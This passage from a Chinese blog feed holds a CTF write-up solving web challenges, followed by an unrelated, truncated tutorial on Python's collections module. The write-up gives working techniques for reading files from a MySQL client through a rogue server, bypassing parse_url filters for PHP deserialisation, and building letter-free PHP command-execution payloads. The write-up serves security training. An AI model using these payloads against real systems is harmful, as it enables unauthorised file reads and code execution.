&lt;span&gt;import&lt;/span&gt;&lt;span&gt; json
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; BaseHTTPServer &lt;span&gt;import&lt;/span&gt;&lt;span&gt; HTTPServer, BaseHTTPRequestHandler
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; optparse &lt;span&gt;import&lt;/span&gt;&lt;span&gt; OptionParser
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; subprocess &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Popen, PIPE


&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; RequestHandler(BaseHTTPRequestHandler):

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; do_GET(self):
        request_path &lt;/span&gt;=&lt;span&gt; self.path

        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n----- Request Start -----&amp;gt;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_path :&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, request_path)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;self.headers :&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, self.headers)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;----- Request End -----\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)

        self.send_response(&lt;/span&gt;200&lt;span&gt;)
        self.send_header(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set-Cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo=bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        self.end_headers()

        result &lt;/span&gt;=&lt;span&gt; self._func()
        self.wfile.write(json.dumps(result))


    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; do_POST(self):
        request_path &lt;/span&gt;=&lt;span&gt; self.path

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;\n----- Request Start -----&amp;gt;\n&quot;)&lt;/span&gt;
        &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_path : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, request_path)

        request_headers &lt;/span&gt;=&lt;span&gt; self.headers
        content_length &lt;/span&gt;= request_headers.getheaders(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;content-length&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        length &lt;/span&gt;= int(content_length[0]) &lt;span&gt;if&lt;/span&gt; content_length &lt;span&gt;else&lt;/span&gt;&lt;span&gt; 0

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;length :&quot;, length)&lt;/span&gt;

        &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;request_headers : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; request_headers)
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;content : %s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.rfile.read(length))
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(&quot;&amp;lt;----- Request End -----\n&quot;)&lt;/span&gt;
&lt;span&gt;
        self.send_response(&lt;/span&gt;200&lt;span&gt;)
        self.send_header(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Set-Cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo=bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
        self.end_headers()
        result &lt;/span&gt;=&lt;span&gt; self._func()
        self.wfile.write(json.dumps(result))

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; _func(self):
        netstat &lt;/span&gt;= Popen([&lt;span&gt;'&lt;/span&gt;&lt;span&gt;netstat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;-tlnp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;], stdout=&lt;span&gt;PIPE)
        netstat.wait()

        ps_list &lt;/span&gt;=&lt;span&gt; netstat.stdout.readlines()
        result &lt;/span&gt;=&lt;span&gt; []
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; item &lt;span&gt;in&lt;/span&gt; ps_list[2&lt;span&gt;:]:
            tmp &lt;/span&gt;=&lt;span&gt; item.split()
            Local_Address &lt;/span&gt;= tmp[3&lt;span&gt;]
            Process_name &lt;/span&gt;= tmp[6&lt;span&gt;]
            tmp_dic &lt;/span&gt;= {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;local_address&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: Local_Address, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Process_name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: Process_name}
            result.append(tmp_dic)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; result

    do_PUT &lt;/span&gt;=&lt;span&gt; do_POST
    do_DELETE &lt;/span&gt;=&lt;span&gt; do_GET


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; main():
    port &lt;/span&gt;= 8123
    &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Listening on localhost:%s&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt; port)
    server &lt;/span&gt;= HTTPServer((&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0.0.0.0&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, port), RequestHandler)
    server.serve_forever()


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
    parser &lt;/span&gt;=&lt;span&gt; OptionParser()
    parser.usage &lt;/span&gt;=&lt;span&gt; (
        &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
        &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Run:\n\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    (options, args) &lt;/span&gt;=&lt;span&gt; parser.parse_args()

    main()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这道题主要是来攻击mysql连接的客户端，这个题目给了agent.py 是用来检测是不是服务器上存在mysqld进程，而判断是通过do_get和do_post两个函数确定的，这两个函数都会调用_func函数，返回进程名，然后do_get 和do_post再把_func的返回值输出，&lt;/p&gt;
&lt;p&gt;所以只需要让最后输出的存在mysqld就行了，然后就可以在服务器上读取客户端的文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428194010309-699157833.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428194145794-50956790.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里读取客户端的.mysql_histoty文件，这个文件存储了用户登陆mysql服务器所执行的命令，也可以读取.bash_history&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428195431768-1859874959.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在这里又可以读到web的源码地址，所以可以继续读取它：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428195741944-1823029182.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在这里能够发现flag所在的库和表，所以就可以读取表中的内容，又因为linux下，mysql安装后，数据库的数据默认存放在/var/lib/mysql目录下，所以可以直接访问其中的库表，所以可以直接读取&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
/var/lib/mysql/security/flag.ibd
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这道题比较常规&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&amp;lt;html&amp;gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;); 
&lt;/span&gt;&lt;span&gt;$file&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;[&quot;file&quot;&lt;span&gt;]; 
&lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;[&quot;payload&quot;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)){
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; 'Missing parameter'.'&amp;lt;br&amp;gt;'&lt;span&gt;;
}
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;(&quot;/flag/&quot;,&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;)){
    &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('hack attacked!!!'&lt;span&gt;);
}
@&lt;/span&gt;&lt;span&gt;include&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$payload&lt;/span&gt;&lt;span&gt;)){  
    &lt;/span&gt;&lt;span&gt;$url&lt;/span&gt; = &lt;span&gt;parse_url&lt;/span&gt;(&lt;span&gt;$_SERVER&lt;/span&gt;['REQUEST_URI'&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;parse_str&lt;/span&gt;(&lt;span&gt;$url&lt;/span&gt;['query'],&lt;span&gt;$query&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;(&lt;span&gt;$query&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$value&lt;/span&gt;&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;(&quot;/flag/&quot;,&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('stop hacking!'&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;();
        }
    }
    &lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = &lt;span&gt;unserialize&lt;/span&gt;(&lt;span&gt;$payload&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{ 
   &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;Missing parameters&quot;&lt;span&gt;; 
} 
&lt;/span&gt;?&amp;gt;
&amp;lt;!--Please test index.php?&lt;span&gt;file&lt;/span&gt;=xxx.php --&amp;gt;
&amp;lt;!--Please get the source of hint.php--&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里主要记录一下绕过parse_url，这里会检测flag字符串，但是要是让parse_url&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428214451233-1011488441.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428214506958-912256717.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样就能使parse_url返回false，这样绕过对flag的过滤，然后后面就是常规的反序列化漏洞，这里要记住最后的序列化的数据因为有不可见字符所以需要urlencode一下&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;94&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php 
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;); 
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;听说你很喜欢数学，不知道你是否爱它胜过爱flag &lt;/span&gt;
&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['c'&lt;span&gt;])){ 
    &lt;/span&gt;&lt;span&gt;show_source&lt;/span&gt;(&lt;span&gt;__FILE__&lt;/span&gt;&lt;span&gt;); 
}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{ 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;例子 c=20-1 &lt;/span&gt;
    &lt;span&gt;$content&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;['c'&lt;span&gt;]; 
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$content&lt;/span&gt;) &amp;gt;= 80&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;太长了不会算&quot;&lt;span&gt;); 
    } 
    &lt;/span&gt;&lt;span&gt;$blacklist&lt;/span&gt; = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]'&lt;span&gt;]; 
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$blacklist&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$blackitem&lt;/span&gt;&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;('/' . &lt;span&gt;$blackitem&lt;/span&gt; . '/m', &lt;span&gt;$content&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;请不要输入奇奇怪怪的字符&quot;&lt;span&gt;); 
        } 
    } 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp &lt;/span&gt;
    &lt;span&gt;$whitelist&lt;/span&gt; = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;preg_match_all&lt;/span&gt;('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', &lt;span&gt;$content&lt;/span&gt;, &lt;span&gt;$used_funcs&lt;/span&gt;&lt;span&gt;); 
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$used_funcs&lt;/span&gt;[0] &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$func&lt;/span&gt;&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;in_array&lt;/span&gt;(&lt;span&gt;$func&lt;/span&gt;, &lt;span&gt;$whitelist&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;请不要输入奇奇怪怪的函数&quot;&lt;span&gt;); 
        } 
    } 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;帮你算出答案 &lt;/span&gt;
    &lt;span&gt;eval&lt;/span&gt;('echo '.&lt;span&gt;$content&lt;/span&gt;.';'&lt;span&gt;); 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 方法一：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这道题主要还是构造没有字母的shell，这里面又提供了进制转换的函数base_convert()，说明可以用0-9a-z 36个字符，那么就可以构造shell，这里主要通过分析一个payload：&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;$pi&lt;span class=&quot;o&quot;&gt;=base_convert&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;m&quot;&gt;37907361743,10,36&lt;span class=&quot;o&quot;&gt;)(dechex&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;m&quot;&gt;1598506324&lt;span class=&quot;o&quot;&gt;))&lt;span class=&quot;p&quot;&gt;;&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;nv&quot;&gt;$$pi&lt;span class=&quot;o&quot;&gt;){pi&lt;span class=&quot;o&quot;&gt;}((&lt;span class=&quot;nv&quot;&gt;$$pi&lt;span class=&quot;o&quot;&gt;){abs&lt;span class=&quot;o&quot;&gt;})&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;span class=&quot;nv&quot;&gt;pi&lt;span class=&quot;o&quot;&gt;=system&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;span class=&quot;nv&quot;&gt;abs&lt;span class=&quot;o&quot;&gt;=cat flag.php&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;这里通过构造动态函数，首先base_convert()构造hex2bin，把16进制转换为字符串，再通过“_GET” -&amp;gt; 16进制表示，再到10进制表示，然后反过来dechex()-&amp;gt;hex2bin()，然后结合动态函数&lt;br/&gt;比如$a=&quot;_GET&quot;;$$a{c}(($$a){d}); 这样将实际的payload放在GET参数中，从而来减小长度。&lt;br/&gt;&lt;span&gt;另外一个点是php的数组不仅可以通过[]来进行索引，还可以通过{}来进行索引。&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;strong&gt;&lt;em&gt;&lt;span&gt;方法2：&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;另一种构造出_GET的方法是通过异或字符串：&lt;br/&gt;比如要得到_G，则可以通过：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428231147764-1774653583.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;具体怎么得出：可以通过“_G”和两个字符异或：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$j&lt;/span&gt;=0;&lt;span&gt;$j&lt;/span&gt;&amp;lt;10;&lt;span&gt;$j&lt;/span&gt; = &lt;span&gt;$j&lt;/span&gt;+1&lt;span&gt;){
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0;&lt;span&gt;$i&lt;/span&gt;&amp;lt;10;&lt;span&gt;$i&lt;/span&gt; = &lt;span&gt;$i&lt;/span&gt;+1&lt;span&gt;){
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$i&lt;/span&gt;.&lt;span&gt;$j&lt;/span&gt;.&quot; &quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;_G&quot;^(&lt;span&gt;$j&lt;/span&gt;).(&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;\n&quot;&lt;span&gt;;
}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428231533186-1272266080.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;可以得到两位字符串，这里也可以选3位或者4位跑，但是因为得到的字符串需要在白名单里面找，所以太长了找不到，所以选两位最好，一位会增加payload长度，因此is是在白名单里存在的，所以就可以使用，同样的方法去找“ET”，最后&lt;br/&gt;还是去构造动态函数就可以了。&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$abs&lt;/span&gt;=(&lt;span&gt;is_finite&lt;/span&gt;^(6).(4)).(&lt;span&gt;rad2deg&lt;/span&gt;^(7).(5));$&lt;span&gt;$abs&lt;/span&gt;{&lt;span&gt;acos&lt;/span&gt;}($&lt;span&gt;$abs&lt;/span&gt;{&lt;span&gt;ceil&lt;/span&gt;})
&lt;/pre&gt;&lt;/div&gt;

&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;

</description>
<pubDate>Sun, 28 Apr 2019 15:20:00 +0000</pubDate>
<dc:creator>tr1ple</dc:creator>
<og:description>拖了好长时间，总结一下这一段时间做的几道值得记录一下的题目，有的没做出来，但是学习到了新的东西 1.homebrew event loop ddctf的一道题目，学到了python eval函数的用法</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</dc:identifier>
</item>
<item>
<title>Python中collections模块 - Python运维开发</title>
<link>http://www.cnblogs.com/dianel/p/10787693.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dianel/p/10787693.html</guid>
<description>&lt;p&gt;这个模块实现了特定目标的容器，以提供Python标准内建容器 dict、list、set、tuple 的替代选择。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Counter：字典的子类，提供了可哈希对象的计数功能&lt;/li&gt;
&lt;li&gt;defaultdict：字典的子类，提供了一个工厂函数，为字典查询提供了默认值&lt;/li&gt;
&lt;li&gt;OrderedDict：字典的子类，保留了他们被添加的顺序&lt;/li&gt;
&lt;li&gt;namedtuple：创建命名元组子类的工厂函数&lt;/li&gt;
&lt;li&gt;deque：类似列表容器，实现了在两端快速添加(append)和弹出(pop)&lt;/li&gt;
&lt;li&gt;ChainMap：类似字典的容器类，将多个映射集合到一个视图里面&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;counter&quot;&gt;Counter&lt;/h2&gt;
&lt;p&gt;Counter是一个dict子类，主要是用来对你访问的对象的频率进行计数。&lt;br/&gt;常用方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;elements()：返回一个迭代器，每个元素重复计算的个数，如果一个元素的计数小于1,就会被忽略。&lt;/li&gt;
&lt;li&gt;most_common([n])：返回一个列表，提供n个访问频率最高的元素和计数&lt;/li&gt;
&lt;li&gt;subtract([iterable-or-mapping])：从迭代对象中减去元素，输入输出可以是0或者负数&lt;/li&gt;
&lt;li&gt;update([iterable-or-mapping])：从迭代对象计数元素或者从另一个 映射对象 (或计数器) 添加。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;# 统计字符出现的次数
&amp;gt;&amp;gt;&amp;gt; import collections
&amp;gt;&amp;gt;&amp;gt; collections.Counter('hello world')
Counter({'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1})
# 统计单词数
&amp;gt;&amp;gt;&amp;gt; collections.Counter('hello world hello world hello nihao'.split())
Counter({'hello': 3, 'world': 2, 'nihao': 1})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;常用的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
&amp;gt;&amp;gt;&amp;gt; c
Counter({'hello': 3, 'world': 2, 'nihao': 1})
# 获取指定对象的访问次数，也可以使用get()方法
&amp;gt;&amp;gt;&amp;gt; c['hello']
3
&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
# 查看元素
&amp;gt;&amp;gt;&amp;gt; list(c.elements())
['hello', 'hello', 'hello', 'world', 'world', 'nihao']
# 追加对象，或者使用c.update(d)
&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
&amp;gt;&amp;gt;&amp;gt; d = collections.Counter('hello world'.split())
&amp;gt;&amp;gt;&amp;gt; c
